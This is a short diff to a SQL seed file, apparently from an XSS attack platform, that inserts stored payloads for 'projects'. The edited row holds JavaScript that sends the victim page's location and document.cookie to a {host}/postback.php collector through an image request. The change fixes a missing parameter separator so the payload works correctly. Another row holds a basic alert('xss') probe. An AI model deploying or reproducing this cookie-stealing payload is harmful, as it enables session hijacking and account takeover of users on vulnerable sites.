@@ -75,7 +75,7 @@ CREATE TABLE `project` (
 --
 
 INSERT INTO `project` (`guid`, `user_guid`, `project_name`, `timestamp`, `payload`) VALUES
-('5WDCa1', @root_uuid, '回传Cookie', '2020-06-20 07:19:13', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);'),
+('5WDCa1', @root_uuid, '回传Cookie', '2020-06-20 07:19:13', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;&amp;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);'),
 ('Hq5Cu9', @root_uuid, '弹窗测试', '2020-06-19 11:30:10', 'alert(&quot;xss&quot;)');
 
 -- --------------------------------------------------------
